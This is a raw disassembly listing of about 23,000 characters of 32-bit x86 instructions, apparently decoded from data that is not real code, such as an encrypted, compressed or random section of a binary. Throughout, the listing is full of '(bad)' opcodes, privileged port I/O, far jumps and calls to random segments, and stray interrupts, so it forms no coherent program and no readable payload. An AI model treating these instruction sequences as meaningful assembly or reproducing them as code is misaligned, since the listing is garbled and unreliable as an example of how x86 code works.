  412f64:	xlat   BYTE PTR ds:[ebx]
  412f65:	push   ss
  412f66:	dec    ebp
  412f67:	cld    
  412f68:	inc    esp
  412f69:	push   ss
  412f6a:	sub    al,0x9e
  412f6c:	sahf   
  412f6d:	mov    ecx,0x4e7f9e30
  412f72:	xchg   ebx,eax
  412f73:	mov    ds:0x52644c1c,eax
  412f78:	or     DWORD PTR [esi-0x6984e30e],edx
  412f7e:	dec    ebp
  412f7f:	gs in  eax,dx
  412f81:	xchg   esp,eax
  412f82:	int3   
  412f83:	inc    BYTE PTR [edx+0x279f9e7f]
  412f89:	jl     0x412f0d
  412f8b:	es pop eax
  412f8d:	xor    BYTE PTR [ebp+0x8b2e0d7],cl
  412f93:	jg     0x412fe2
  412f95:	(bad)  
  412f96:	sar    DWORD PTR ds:0x837d96f8,1
  412f9c:	mov    ah,0x35
  412f9e:	scas   al,BYTE PTR es:[edi]
  412f9f:	fs pop edi
  412fa1:	inc    edi
  412fa2:	(bad)  
  412fa3:	(bad)  
  412fa5:	repz mov eax,0x556bf459
  412fab:	das    
  412fac:	pop    ebp
  412fad:	jmp    FWORD PTR [eax-0x3b228c5f]
  412fb3:	sbb    eax,0x117a1749
  412fb8:	mov    eax,ds:0xc375b06b
  412fbd:	pop    eax
  412fbe:	loop   0x413003
  412fc0:	lds    edx,FWORD PTR [ebp+0x230c031e]
  412fc6:	ffree  st(0)
  412fc8:	retf   
  412fc9:	push   esp
  412fca:	lds    edi,FWORD PTR [ebp+0x54]
  412fcd:	sbb    esi,DWORD PTR [ecx+0x42]
  412fd0:	xchg   ecx,eax
  412fd1:	icebp  
  412fd2:	test   al,0xc1
  412fd4:	rol    ecx,cl
  412fd6:	xchg   ebp,eax
  412fd7:	das    
  412fd8:	(bad)  
  412fd9:	in     eax,0xb6
  412fdb:	stos   DWORD PTR es:[edi],eax
  412fdc:	sub    dh,BYTE PTR [edi+0x69]
  412fdf:	adc    DWORD PTR [esi-0x58],ecx
  412fe2:	in     al,0xfd
  412fe4:	mov    DWORD PTR [ebp-0x4caba1ff],eax
  412fea:	xor    dh,ah
  412fec:	popf   
  412fed:	jp     0x413001
  412fef:	jmp    DWORD PTR [edi-0x2f]
  412ff2:	cmp    BYTE PTR [eax+0x37],dl
  412ff5:	(bad)  
  412ff6:	leave  
  412ff7:	jmp    0x413015
  412ff9:	mov    ecx,DWORD PTR [ebx]
  412ffb:	sbb    BYTE PTR [esi-0x8],bh
  412ffe:	hlt    
  412fff:	fldenv [ebp+0x6f57c87b]
  413005:	push   ecx
  413006:	sar    BYTE PTR [esi+ecx*8+0x3f1aba5c],1
  41300d:	fistp  QWORD PTR [edx]
  41300f:	jae    0x412fec
  413011:	mov    edx,0x6f70fc86
  413016:	into   
  413017:	daa    
  413018:	push   eax
  413019:	retf   
  41301a:	push   ds
  41301b:	add    BYTE PTR [edi+ebp*1-0xe],al
  41301f:	sbb    eax,0xbb564bbf
  413024:	retf   0x8b7c
  413027:	inc    esi
  413028:	xchg   edi,eax
  413029:	cmc    
  41302a:	mov    eax,0xe6792f97
  41302f:	fldenv [ebx]
  413031:	jl     0x413094
  413033:	xchg   edx,eax
  413034:	jmp    0x3de6d490
  413039:	pop    eax
  41303a:	pushf  
  41303b:	(bad)  
  41303c:	push   ebp
  41303d:	aas    
  41303e:	ds enter 0xa3f4,0xe2
  413043:	mov    fs,WORD PTR [edi+esi*2]
  413046:	mul    esp
  413048:	sbb    BYTE PTR [esi+eax*8+0x76],bl
  41304c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41304d:	adc    al,bl
  41304f:	sub    edx,DWORD PTR [ebx]
  413051:	(bad)  
  413052:	pop    ebp
  413053:	int    0xee
  413055:	or     edi,DWORD PTR [eax]
  413057:	mov    bh,0xd
  413059:	mov    ds:0x7bf7d3a9,al
  41305e:	in     eax,dx
  41305f:	mov    bl,0x65
  413061:	fmul   DWORD PTR [edx]
  413063:	jmp    0x413052
  413065:	pop    edi
  413066:	clc    
  413067:	(bad)  [edx+0x4c]
  41306a:	cmp    DWORD PTR [edi+edi*2-0x40],edx
  41306e:	mov    DWORD PTR [ecx],0x9c0e4ded
  413074:	ja     0x413020
  413076:	jo     0x4130d5
  413078:	jo     0x412ffd
  41307a:	test   eax,0x9431b844
  41307f:	sbb    BYTE PTR [ecx+ebp*8],cl
  413082:	add    al,0xaa
  413084:	popf   
  413085:	das    
  413086:	sbb    BYTE PTR [ebx+0x14],dl
  413089:	outs   dx,DWORD PTR ds:[esi]
  41308a:	mov    ah,0x1c
  41308c:	aad    0xc2
  41308e:	shr    DWORD PTR [edx],0x5
  413091:	inc    edi
  413092:	mul    ecx
  413094:	xlat   BYTE PTR ds:[ebx]
  413095:	in     al,0xe2
  413097:	cmp    bl,dl
  413099:	and    ebx,edi
  41309b:	add    eax,0x1f68ff8e
  4130a0:	pop    ebx
  4130a1:	xor    al,0x3e
  4130a3:	dec    eax
  4130a4:	jne    0x413094
  4130a6:	int    0xf2
  4130a8:	sbb    dh,BYTE PTR [edx+0x73]
  4130ab:	push   cs
  4130ac:	scas   eax,DWORD PTR es:[edi]
  4130ad:	addr16 push cs
  4130af:	inc    eax
  4130b0:	pop    edi
  4130b1:	push   ebx
  4130b2:	lock in al,0xdb
  4130b5:	pop    ecx
  4130b6:	fsub   QWORD PTR [ebx-0x7e7c807d]
  4130bc:	jmp    0xcc74:0x9085a150
  4130c3:	mov    dh,0x37
  4130c5:	mov    al,0x21
  4130c7:	(bad)
  4130cb:	dec    ecx
  4130cc:	imul   cl
  4130ce:	add    BYTE PTR [esp+edx*2],0x98
  4130d2:	std    
  4130d3:	add    al,0xf4
  4130d5:	lods   eax,DWORD PTR gs:[esi]
  4130d7:	retf   
  4130d8:	sub    eax,0x1beace5f
  4130dd:	xor    BYTE PTR [ecx],ch
  4130df:	xchg   BYTE PTR [ebx-0x28ed6597],ch
  4130e5:	enter  0x17d9,0xc1
  4130e9:	xchg   ecx,eax
  4130ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130eb:	adc    esi,ebx
  4130ed:	mov    BYTE PTR [esi-0x3f],ah
  4130f0:	inc    esi
  4130f1:	addr16 mov edi,edi
  4130f4:	sub    cl,BYTE PTR [esi]
  4130f6:	das    
  4130f7:	enter  0xf7d6,0xa7
  4130fb:	aad    0x9f
  4130fd:	out    dx,eax
  4130fe:	adc    DWORD PTR [ecx],esp
  413100:	fld    QWORD PTR [ecx+0x12d9986e]
  413106:	mov    dl,0xd4
  413108:	push   0x3d
  41310a:	scas   al,BYTE PTR es:[edi]
  41310b:	pop    ss
  41310c:	inc    esi
  41310d:	cmp    BYTE PTR [eax],ah
  41310f:	jb     0x41310f
  413111:	ins    BYTE PTR es:[edi],dx
  413112:	xlat   BYTE PTR ds:[ebx]
  413113:	jae    0x413129
  413115:	sub    edx,esi
  413117:	popf   
  413118:	or     DWORD PTR [ebx+0x51e1e482],eax
  41311e:	rcl    DWORD PTR [edx+0x44],0x22
  413122:	shl    DWORD PTR [ebp-0x3b],cl
  413125:	dec    esp
  413126:	cdq    
  413127:	jle    0x41319c
  413129:	outs   dx,DWORD PTR ds:[esi]
  41312a:	cs out dx,al
  41312c:	fistp  QWORD PTR [ebx+0x5]
  41312f:	xor    ecx,ebp
  413131:	popf   
  413132:	ror    DWORD PTR [ecx],1
  413134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413135:	test   al,0xd3
  413137:	(bad)  [esi-0x5bb3e96d]
  41313d:	push   esi
  41313e:	xlat   BYTE PTR ds:[ebx]
  41313f:	mov    edi,0x605895f4
  413144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413145:	jbe    0x413172
  413147:	cli    
  413148:	fs pop ecx
  41314a:	xor    BYTE PTR [edi-0x51],cl
  41314d:	inc    ebp
  41314e:	std    
  41314f:	mov    dl,0x3f
  413151:	jle    0x413102
  413153:	inc    eax
  413154:	retf   0x8b0b
  413157:	adc    al,0x97
  413159:	fld    QWORD PTR [ebp+0xb]
  41315c:	jmp    0x41311f
  41315e:	adc    dh,BYTE PTR [edx]
  413160:	into   
  413161:	sub    BYTE PTR [eax],bl
  413163:	xor    BYTE PTR [eax],0xd3
  413166:	les    edx,FWORD PTR [eax]
  413168:	sbb    eax,0x5e75b047
  41316d:	mov    ebx,0xad1a044f
  413172:	sub    eax,edi
  413174:	xchg   bl,ah
  413176:	ror    BYTE PTR [ecx+0x2374310d],cl
  41317c:	mov    BYTE PTR [ebx-0x6ac13ae2],0x5c
  413183:	call   0x73d7:0x71a662d8
  41318a:	out    dx,al
  41318b:	push   0xffffffec
  41318d:	add    eax,0x248c71a
  413192:	mov    ds:0x51c65e2a,eax
  413197:	in     eax,dx
  413198:	imul   ecx,ecx,0x4e
  41319b:	das    
  41319c:	inc    ecx
  41319d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41319e:	push   ss
  41319f:	sar    DWORD PTR ds:[edi],0x15
  4131a3:	jmp    0x275a700f
  4131a8:	push   ss
  4131a9:	pop    ecx
  4131aa:	pop    ebx
  4131ab:	jns    0x41320e
  4131ad:	pop    eax
  4131ae:	ficom  DWORD PTR [ebp-0x67]
  4131b1:	jns    0x41313f
  4131b3:	in     al,dx
  4131b4:	int3   
  4131b5:	mov    edx,DWORD PTR [ecx-0x5db6e48b]
  4131bb:	call   0x21787d0
  4131c0:	test   eax,0x6f54888e
  4131c5:	add    ch,ch
  4131c7:	xchg   esi,eax
  4131c8:	sti    
  4131c9:	fisttp DWORD PTR [eax+ebx*2+0x2eacddb8]
  4131d0:	mov    eax,0x5d8526df
  4131d5:	lods   eax,DWORD PTR ds:[esi]
  4131d6:	pusha  
  4131d7:	pop    edi
  4131d8:	gs sbb bl,0xf0
  4131dc:	das    
  4131dd:	sar    BYTE PTR [eax],cl
  4131df:	lock inc ebp
  4131e1:	mov    dh,0xef
  4131e3:	into   
  4131e4:	shl    esi,cl
  4131e6:	inc    edi
  4131e7:	mov    ah,0x78
  4131e9:	scas   al,BYTE PTR es:[edi]
  4131ea:	add    al,0xec
  4131ec:	inc    edx
  4131ed:	imul   edi,DWORD PTR [esi-0x17],0xa4c0e7c3
  4131f4:	outs   dx,BYTE PTR ds:[esi]
  4131f5:	ins    DWORD PTR es:[edi],dx
  4131f6:	mov    cl,0xc5
  4131f8:	xor    BYTE PTR [ebp-0x4d],bl
  4131fb:	jp     0x4131fa
  4131fd:	and    eax,0xd775d56d
  413202:	and    bl,bl
  413204:	icebp  
  413205:	jl     0x41325a
  413207:	data16 lahf 
  413209:	jecxz  0x4131e6
  41320b:	xchg   ebp,eax
  41320c:	call   0x3084027b
  413211:	jns    0x4131e9
  413213:	call   0xdf05:0xc146706a
  41321a:	pop    eax
  41321b:	in     al,dx
  41321c:	outs   dx,BYTE PTR ds:[esi]
  41321d:	in     eax,0x6e
  41321f:	dec    esp
  413220:	lea    esp,[edi+0x70]
  413223:	dec    esp
  413224:	fadd   DWORD PTR [ebp-0x67]
  413227:	cdq    
  413228:	mov    eax,ds:0x5c77c328
  41322d:	xchg   ebp,eax
  41322e:	lock (bad) 
  413230:	jnp    0x4131ea
  413232:	cs hlt 
  413234:	jmp    0x413215
  413236:	aad    0x8e
  413238:	xor    cl,cl
  41323a:	push   0x69a9d501
  41323f:	push   ss
  413240:	inc    edx
  413241:	pusha  
  413242:	int    0x79
  413244:	pop    ebp
  413245:	jo     0x4131e5
  413247:	mov    edx,0xc7d9445
  41324c:	sbb    DWORD PTR [ebx+0x45bc94f2],ebx
  413252:	mov    eax,0x8bbb67d6
  413257:	nop
  413258:	pop    eax
  413259:	test   BYTE PTR [esi+0xc],bl
  41325c:	jmp    0x40e1:0x27276ae7
  413263:	popf   
  413264:	les    edx,FWORD PTR [ebp-0x7a]
  413267:	lods   eax,DWORD PTR ds:[esi]
  413268:	repnz cs xor al,0x28
  41326c:	cwde   
  41326d:	ss push ds
  41326f:	clc    
  413270:	xor    eax,0x5124ef00
  413275:	stos   BYTE PTR es:[edi],al
  413276:	mov    esp,DWORD PTR ds:0x30c4f602
  41327c:	test   DWORD PTR [eax],esi
  41327e:	je     0x413255
  413280:	push   esp
  413281:	pop    es
  413282:	lds    edi,FWORD PTR fs:[ecx]
  413285:	or     DWORD PTR [eax+0x4701722f],0xffffffa0
  41328c:	imul   edi,DWORD PTR [edi-0x5842ca72],0x93f16fed
  413296:	pop    edx
  413297:	inc    eax
  413298:	xchg   DWORD PTR [edi+eiz*8+0x57acc680],ecx
  41329f:	scas   al,BYTE PTR es:[edi]
  4132a0:	int    0x89
  4132a2:	rcl    BYTE PTR [ebp-0x41],1
  4132a5:	jmp    0xf158:0x98b93b02
  4132ac:	cld    
  4132ad:	xor    al,BYTE PTR [edx+ebp*1]
  4132b0:	mov    edx,0x9ea1bea0
  4132b5:	pop    ecx
  4132b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b7:	and    dl,BYTE PTR [edi+0x4d]
  4132ba:	fisubr WORD PTR [eax+0x3a6a8710]
  4132c0:	nop
  4132c1:	ret    
  4132c2:	sub    eax,0xf3b5337f
  4132c7:	std    
  4132c8:	sub    dl,BYTE PTR [esi]
  4132ca:	mov    ebp,0xc4bef3c6
  4132cf:	push   esp
  4132d0:	rcr    BYTE PTR [edx+edi*8+0x4fa06108],cl
  4132d7:	icebp  
  4132d8:	ret    
  4132d9:	jmp    0x413311
  4132db:	call   0xdc1eca86
  4132e0:	enter  0x15b9,0xea
  4132e4:	mov    ebp,eax
  4132e6:	inc    edi
  4132e7:	xchg   ebp,eax
  4132e8:	mov    al,ds:0xdb18086f
  4132ed:	sbb    al,0x53
  4132ef:	not    BYTE PTR [ecx+0x2c]
  4132f2:	adc    DWORD PTR [ebx-0x24],0xffffff9d
  4132f6:	rol    DWORD PTR [ecx+0x7cf9100d],cl
  4132fc:	mov    ah,BYTE PTR [ebx]
  4132fe:	retf   
  4132ff:	push   es
  413300:	hlt    
  413301:	jns    0x413377
  413303:	repnz int3 
  413305:	test   DWORD PTR [esi],ecx
  413307:	adc    BYTE PTR [edx+0x4f],dl
  41330a:	mov    edx,0x80704d91
  41330f:	pop    ecx
  413310:	adc    BYTE PTR [edx],al
  413312:	dec    ebp
  413313:	addr16 in al,0xe7
  413316:	or     DWORD PTR [ebx-0x3b],ebp
  413319:	cwde   
  41331a:	repnz push cs
  41331c:	mov    fs,WORD PTR [esp+ebx*8+0x31]
  413320:	into   
  413321:	inc    ebp
  413322:	inc    ebp
  413323:	mov    ch,0x66
  413325:	clc    
  413326:	or     ah,BYTE PTR [eax]
  413328:	jle    0x41337b
  41332a:	outs   dx,BYTE PTR ds:[esi]
  41332b:	cwde   
  41332c:	dec    edx
  41332d:	push   0xfad6a3a8
  413332:	ret    0xfe1f
  413335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413336:	dec    esp
  413337:	inc    ebx
  413338:	mov    ds:0x7431d203,eax
  41333d:	ret    
  41333e:	cs inc eax
  413340:	in     eax,0x4
  413342:	adc    dl,BYTE PTR [esi]
  413344:	enter  0xa3eb,0x71
  413348:	retf   0x59b8
  41334b:	cli    
  41334c:	(bad)  
  41334d:	sbb    bh,BYTE PTR [ebp+0x41a59690]
  413353:	xchg   ebp,eax
  413354:	sub    al,0x8f
  413356:	js     0x413352
  413358:	(bad)  [edx]
  41335a:	cmc    
  41335b:	xor    dh,BYTE PTR [eax+0x4a82affe]
  413361:	or     al,0xd4
  413363:	loope  0x41338b
  413365:	push   edi
  413366:	adc    BYTE PTR [ebx-0x618c7d2f],dl
  41336c:	mov    al,ds:0xf374baeb
  413371:	pop    esp
  413372:	cmp    al,0xcb
  413374:	out    dx,al
  413375:	(bad)  
  413376:	aad    0x7c
  413378:	xlat   BYTE PTR ds:[ebx]
  413379:	rol    DWORD PTR [esi],1
  41337b:	push   0xd4f6f84f
  413380:	mov    dl,0xb7
  413382:	jno    0x41338f
  413384:	in     eax,0x6b
  413386:	out    dx,eax
  413387:	int3   
  413388:	and    esi,DWORD PTR [ebx]
  41338a:	lahf   
  41338b:	sub    edi,esi
  41338d:	jb     0x413368
  41338f:	mov    ecx,0x1e9228
  413394:	push   edx
  413395:	ja     0x413400
  413397:	inc    edx
  413398:	mov    edi,0x92eeb376
  41339d:	sbb    al,0xb2
  41339f:	icebp  
  4133a0:	sbb    eax,0x8ac00f2b
  4133a5:	inc    eax
  4133a6:	(bad)  
  4133a7:	sub    esp,DWORD PTR [edi+0x517b58eb]
  4133ad:	sbb    bl,dh
  4133af:	loopne 0x4133f1
  4133b1:	sti    
  4133b2:	jmp    0x13020dab
  4133b7:	fld    TBYTE PTR [ebx+ebp*2]
  4133ba:	jo     0x413439
  4133bc:	js     0x4133aa
  4133be:	push   eax
  4133bf:	or     ch,0xcd
  4133c2:	retf   
  4133c3:	add    al,dh
  4133c5:	sub    al,0x31
  4133c7:	xor    BYTE PTR [esi+ebx*4],al
  4133ca:	xchg   esp,eax
  4133cb:	ins    DWORD PTR es:[edi],dx
  4133cc:	pop    edx
  4133cd:	(bad)  
  4133ce:	out    0x74,al
  4133d0:	dec    eax
  4133d1:	mov    al,0x46
  4133d3:	sar    edx,1
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	mov    dh,0xe
  4133d8:	mov    edx,0xd5aa3676
  4133dd:	mov    eax,ds:0xf4cd5fc7
  4133e2:	add    BYTE PTR [edi],ah
  4133e4:	sahf   
  4133e5:	pop    edi
  4133e6:	xchg   BYTE PTR [eax],al
  4133e8:	jae    0x41341a
  4133ea:	shl    BYTE PTR [ebx],0xce
  4133ed:	xlat   BYTE PTR ds:[ebx]
  4133ee:	jno    0x41341e
  4133f0:	xchg   DWORD PTR [eax-0x62],ebx
  4133f3:	add    DWORD PTR [ecx+0x32],esi
  4133f6:	(bad)  [eax]
  4133f8:	fnstsw WORD PTR [esi-0xcd11b59]
  4133fe:	inc    ebp
  4133ff:	mov    WORD PTR [ebp+0x60],fs
  413402:	jmp    0x630e:0xf38fdf08
  413409:	aam    0x62
  41340b:	push   0x2d
  41340d:	mov    ebp,0xf0f27df4
  413412:	inc    ebx
  413413:	xor    DWORD PTR [esi+0x7a],eax
  413416:	fdivp  st(0),st
  413418:	in     eax,dx
  413419:	mov    al,ds:0x2b7ba7a4
  41341e:	in     al,dx
  41341f:	or     ch,BYTE PTR [ebp-0x288e77b5]
  413425:	leave  
  413426:	rcl    BYTE PTR [ebp-0x65],0xa0
  41342a:	int3   
  41342b:	in     al,0xfb
  41342d:	xor    DWORD PTR [ebx],eax
  41342f:	into   
  413430:	ja     0x413437
  413432:	(bad)  
  413435:	push   es
  413436:	test   DWORD PTR [edi-0x5d115c58],esp
  41343c:	(bad)  [eax+0x64]
  41343f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413440:	(bad)  
  413442:	or     al,0x19
  413444:	leave  
  413445:	sti    
  413446:	out    0xd7,eax
  413448:	fdiv   DWORD PTR [esi]
  41344a:	cmp    edx,DWORD PTR [esi-0xa]
  41344d:	out    0x7f,al
  41344f:	out    0x8d,al
  413451:	xor    ebx,DWORD PTR [ebx]
  413453:	cli    
  413454:	cmp    DWORD PTR [edi],0x2c
  413457:	cli    
  413458:	jno    0x41341b
  41345a:	test   bh,dh
  41345c:	neg    DWORD PTR [edx]
  41345e:	(bad)  
  413460:	das    
  413461:	inc    edi
  413462:	je     0x4134cd
  413464:	or     DWORD PTR [edi-0x8d7c7ee],eax
  41346a:	aam    0x85
  41346c:	push   eax
  41346d:	cmp    ah,BYTE PTR [edi+0x67]
  413470:	leave  
  413471:	out    0xc9,al
  413473:	inc    eax
  413474:	shl    BYTE PTR [edi+ebp*1+0x7c],cl
  413478:	push   ebx
  413479:	je     0x413441
  41347b:	(bad)  
  41347c:	jp     0x413495
  41347e:	jns    0x4134e9
  413480:	mov    bl,0x82
  413482:	jno    0x413491
  413484:	jmp    0x41340f
  413486:	adc    esp,DWORD PTR [ecx-0x5c561044]
  41348c:	and    BYTE PTR [edx+0x52f25a9],ch
  413492:	(bad)  
  413493:	cmp    eax,0x6b5b9b0e
  413498:	pop    ebx
  413499:	dec    esi
  41349a:	sbb    BYTE PTR [edi-0x31],bl
  41349d:	scas   eax,DWORD PTR es:[edi]
  41349e:	(bad)  
  41349f:	push   eax
  4134a0:	pop    ss
  4134a1:	retf   0x69b1
  4134a4:	(bad)  
  4134a5:	mov    ds:0x783f9894,al
  4134aa:	sbb    eax,0xdc9a5903
  4134af:	jl     0x413508
  4134b1:	lds    edi,FWORD PTR [ebx+0x298a3c1c]
  4134b7:	arpl   WORD PTR [edi+0x4e5de99f],si
  4134bd:	retfw  
  4134bf:	test   BYTE PTR [esi+0x14],ch
  4134c2:	add    DWORD PTR ds:0x88d616e1,ebx
  4134c8:	test   al,0x43
  4134ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134cb:	mov    dx,0xcce4
  4134cf:	add    bh,dh
  4134d1:	(bad)  
  4134d2:	dec    edi
  4134d3:	loop   0x413498
  4134d5:	mov    ebx,0xcce1aca4
  4134da:	ret    0x4084
  4134dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134de:	imul   DWORD PTR [ebx+edi*4]
  4134e1:	mov    DWORD PTR [edx-0x6cfa7da8],ebx
  4134e7:	or     al,0x5c
  4134e9:	push   ds
  4134ea:	push   ecx
  4134eb:	mov    edi,0xf137a8a1
  4134f0:	ret    
  4134f1:	ds jns 0x413500
  4134f4:	add    BYTE PTR [ebx+0x3ad2b296],cl
  4134fa:	out    0xfb,eax
  4134fc:	push   es
  4134fd:	outs   dx,DWORD PTR ds:[esi]
  4134fe:	cmp    eax,0x1b3f1fe7
  413503:	mov    eax,ds:0xcbf04faf
  413508:	adc    eax,0x4559c826
  41350d:	ret    
  41350e:	test   esi,edx
  413510:	cmp    DWORD PTR ds:[edx],0xffffffc7
  413514:	in     eax,dx
  413515:	dec    ebx
  413516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413517:	repz repnz in eax,0xcb
  41351b:	fcom   DWORD PTR [ebp+0x6d61a259]
  413521:	(bad)  
  413522:	mov    dl,0x7b
  413524:	or     ch,cl
  413526:	and    ebp,DWORD PTR ds:0x69074179
  41352c:	(bad)  
  41352e:	push   0xffffffef
  413530:	sar    eax,1
  413532:	fnstsw WORD PTR [ecx+0x30a6d13f]
  413538:	sbb    ah,dh
  41353a:	stos   BYTE PTR es:[edi],al
  41353b:	lds    ebp,FWORD PTR [ecx-0x34]
  41353e:	adc    cl,0x88
  413541:	inc    edx
  413542:	or     bh,BYTE PTR [edx-0x1756d204]
  413548:	add    DWORD PTR [edi],0xec934948
  41354e:	test   al,bl
  413550:	jbe    0x4134fc
  413552:	mov    ds:0x61561459,eax
  413557:	cmp    DWORD PTR [edx+edx*1],ebx
  41355a:	sti    
  41355b:	mov    esp,0xa9de5829
  413560:	push   ebx
  413561:	add    BYTE PTR [eax-0xfc956c3],0x9b
  413568:	data16 jno 0x4134ef
  41356b:	shr    BYTE PTR [ebx-0x3e],0x97
  41356f:	inc    eax
  413570:	fiadd  WORD PTR [edx*2+0x7b799cbf]
  413577:	push   ss
  413578:	jp     0x413540
  41357a:	mov    ebp,DWORD PTR [edi]
  41357c:	jns    0x41359e
  41357e:	std    
  41357f:	inc    esp
  413580:	xchg   ecx,eax
  413581:	mov    ebp,0x600657cd
  413586:	pop    ecx
  413587:	outs   dx,BYTE PTR ds:[esi]
  413588:	(bad)  
  413589:	jns    0x41355c
  41358b:	adc    DWORD PTR [esp+ebp*2-0x7fcc9ed5],ebx
  413592:	adc    al,0xb4
  413594:	sbb    eax,0x7cd7380d
  413599:	pop    edx
  41359a:	mov    al,ds:0x61c04766
  41359f:	out    dx,al
  4135a0:	in     eax,dx
  4135a1:	data16 xor al,0x2f
  4135a4:	in     eax,dx
  4135a5:	hlt    
  4135a6:	int    0x1e
  4135a8:	xchg   esp,eax
  4135a9:	pusha  
  4135aa:	addr16 loopne 0x41359d
  4135ad:	aaa    
  4135ae:	dec    esi
  4135af:	or     DWORD PTR [edx],edi
  4135b1:	xchg   ebp,eax
  4135b2:	inc    ecx
  4135b3:	int    0x6
  4135b5:	daa    
  4135b6:	jle    0x4135ec
  4135b8:	xor    BYTE PTR ds:0x66a0b926,0xed
  4135bf:	sbb    eax,0x2315a8fd
  4135c4:	add    eax,0x4db7f67f
  4135c9:	(bad)  
  4135ca:	cmp    eax,0x5f25decb
  4135cf:	rcl    DWORD PTR [esi+eax*2+0x18],0x51
  4135d4:	out    dx,eax
  4135d5:	mov    WORD PTR [esi],es
  4135d7:	jle    0x4135ff
  4135d9:	dec    ebx
  4135da:	cmc    
  4135db:	sub    ebp,ecx
  4135dd:	jl     0x41365a
  4135df:	mov    ds:0x73ef066,al
  4135e4:	stc    
  4135e5:	jns    0x41361d
  4135e7:	rep outs dx,DWORD PTR ds:[esi]
  4135e9:	call   0x7e89:0xd4906651
  4135f0:	xchg   ebx,eax
  4135f1:	xlat   BYTE PTR ds:[ebx]
  4135f2:	dec    ebx
  4135f3:	cwde   
  4135f4:	fmul   QWORD PTR [esi]
  4135f6:	sbb    ebp,DWORD PTR [eax-0x19fa6667]
  4135fc:	push   esp
  4135fd:	sti    
  4135fe:	in     al,0xd1
  413600:	mov    edi,DWORD PTR [ecx]
  413602:	fbstp  TBYTE PTR ds:0xaea3fa76
  413608:	(bad)  [esi]
  41360a:	inc    bp
  41360c:	hlt    
  41360d:	and    al,0xf5
  41360f:	or     esi,DWORD PTR [eax-0x9]
  413612:	jmp    0x2ef7:0xd88aeaba
  413619:	inc    edi
  41361a:	pop    ss
  41361b:	pop    esi
  41361c:	add    eax,0xde5a77c4
  413621:	xchg   esp,eax
  413622:	aam    0x88
  413624:	push   esi
  413625:	xchg   ecx,esi
  413627:	lahf   
  413628:	test   DWORD PTR [edx+edx*4],ecx
  41362b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41362c:	jecxz  0x413694
  41362e:	mov    dh,0x55
  413630:	mov    eax,ds:0xe8f718ef
  413635:	push   0xf32de326
  41363a:	xchg   edx,eax
  41363b:	cmp    edx,DWORD PTR [edi]
  41363d:	dec    ecx
  41363e:	in     al,0xb2
  413640:	das    
  413641:	sbb    al,0xdf
  413643:	in     eax,0x85
  413645:	inc    esp
  413646:	dec    esi
  413647:	shr    DWORD PTR [edx],0xcf
  41364a:	adc    BYTE PTR [ecx+0x6e4c2452],dl
  413650:	sub    DWORD PTR [ebp-0x24],edx
  413653:	dec    ebx
  413654:	fstp   TBYTE PTR [edi+edx*1-0x7]
  413658:	sub    dh,ah
  41365a:	sub    al,0xd2
  41365c:	pop    ds
  41365d:	jb     0x413625
  41365f:	push   esp
  413660:	(bad)  
  413661:	fistp  WORD PTR [esi-0x27fb4a8d]
  413667:	shr    BYTE PTR [ecx-0x15],1
  41366a:	push   esi
  41366b:	mov    bl,0xd3
  41366d:	shr    DWORD PTR ds:0xf4681e06,cl
  413673:	je     0x4136cc
  413675:	push   cs
  413676:	cmp    ebx,DWORD PTR [eax]
  413678:	aam    0x56
  41367a:	mov    edx,0x3eac0c39
  41367f:	daa    
  413680:	mov    edx,0x374117c
  413685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413686:	lahf   
  413687:	retf   0x7c3e
  41368a:	jge    0x413656
  41368c:	jns    0x413681
  41368e:	aas    
  41368f:	push   0x37
  413691:	pop    es
  413692:	ins    DWORD PTR es:[edi],dx
  413693:	inc    edi
  413694:	dec    esp
  413695:	test   al,0xbb
  413697:	fcmovnb st,st(7)
  413699:	push   esp
  41369a:	add    bl,0xfa
  41369d:	lods   eax,DWORD PTR ds:[esi]
  41369e:	mov    ch,0xb6
  4136a0:	popf   
  4136a1:	cwde   
  4136a2:	pop    ds
  4136a3:	push   es
  4136a4:	js     0x4136fa
  4136a6:	push   0x6aa1597a
  4136ab:	gs push 0xffffffde
  4136ae:	mov    ebx,0x4a982a0f
  4136b3:	dec    esi
  4136b4:	pusha  
  4136b5:	jb     0x413639
  4136b7:	les    ebx,FWORD PTR [esi-0x7f]
  4136ba:	mov    ch,0xc
  4136bc:	pop    esp
  4136bd:	xchg   ebx,eax
  4136be:	sub    cl,BYTE PTR [edi+0x10]
  4136c1:	pushf  
  4136c2:	mov    dh,0x1d
  4136c4:	or     al,0x8a
  4136c6:	push   ss
  4136c7:	and    ah,al
  4136c9:	aas    
  4136ca:	lods   eax,DWORD PTR fs:[esi]
  4136cc:	data16 jne 0x4136c1
  4136cf:	or     DWORD PTR [edi+0x28],eax
  4136d2:	pop    ecx
  4136d3:	out    dx,al
  4136d4:	jge    0x41367d
  4136d6:	dec    esi
  4136d7:	sbb    cl,BYTE PTR [ebx-0x11e1e8dd]
  4136dd:	xchg   esi,eax
  4136de:	aaa    
  4136df:	sub    DWORD PTR ds:0x835d70a4,0xffffffe7
  4136e6:	data16 jae 0x413714
  4136e9:	and    esp,esi
  4136eb:	or     bl,BYTE PTR [ecx+0x52]
  4136ee:	xchg   DWORD PTR [edx-0x59],eax
  4136f1:	pop    edi
  4136f2:	xor    eax,0xf2a5cb13
  4136f7:	bound  esi,QWORD PTR [edi]
  4136f9:	daa    
  4136fa:	push   0x41
  4136fc:	and    bl,BYTE PTR [ebx]
  4136fe:	fwait
  4136ff:	inc    edi
  413701:	mov    ebp,0xf206c177
  413706:	xor    ch,cl
  413708:	retf   0x847e
  41370b:	pop    edx
  41370c:	std    
  41370d:	loope  0x4136ae
  41370f:	adc    al,0xc2
  413711:	popf   
  413712:	pop    esi
  413713:	js     0x4136d7
  413715:	(bad)  
  413716:	in     al,0xdf
  413718:	xchg   esi,eax
  413719:	inc    ebp
